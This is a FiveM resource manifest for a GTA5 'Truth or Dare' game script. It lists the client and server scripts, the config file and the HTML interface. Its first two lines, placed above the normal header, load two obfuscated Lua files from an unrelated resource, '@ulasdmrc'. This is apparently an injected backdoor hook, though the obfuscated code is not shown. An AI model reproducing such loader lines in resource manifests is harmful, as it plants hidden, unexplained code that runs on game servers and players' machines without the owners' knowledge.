shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

 
fx_version 'cerulean'
game 'gta5'
version '1.0.0'
title "Truth or Dare"
description "Truth or Dare?"
author "InDream#9996"
shared_scripts {
    'config.lua',
}
client_script {
	'client/main.lua',
	'config.lua'
}
server_scripts {
	'server/main.lua',
}
ui_page "html/index.html"
files {
    "html/index.html",
    "html/css/style.css",
    "html/js/main.js"
}